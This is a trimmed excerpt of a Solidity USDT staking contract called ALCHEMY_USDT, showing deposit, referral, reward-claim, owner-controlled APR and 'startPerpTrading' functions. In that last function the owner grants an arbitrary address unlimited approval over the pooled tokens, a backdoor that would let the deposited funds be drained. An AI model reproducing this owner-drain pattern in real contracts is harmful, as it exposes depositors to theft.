...
contract ALCHEMY_USDT is Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    uint256 public developerFee = 200;
    uint256 public referrerReward = 1000;
    uint256 public rewardPeriod = 1 days;
    uint256 public withdrawPeriod = 60 * 60 * 24 * 28;
    ...
    function deposit(uint256 _amount, address _referrer) external {
        ...
        if (
            address(0) != _referrer &&
            investors[msg.sender].referrer == address(0)
        ) {
    ...
    function claimAllReward() public nonReentrant {
        ...
        if (investors[msg.sender].referrer != address(0)) {
            referrerAmount = (amountToSend * referrerReward).div(percentRate);
        ...
        IERC20(tokenContract).safeTransfer(msg.sender, amountToSend);

        totalReward = totalReward.add(amountToSend).add(referrerAmount);
    }
    ...
    function updateApr(uint256 _apr) public onlyOwner {
        apr = _apr;
        aprState.push(AprStruct({apr: _apr, lastUpdateTime: block.timestamp}));
    }
    ...
    function startPerpTrading(address _tradeHelper) public onlyOwner {
        tradeHelper = _tradeHelper;
        IERC20(tokenContract).safeApprove(tradeHelper, type(uint256).max);
    }
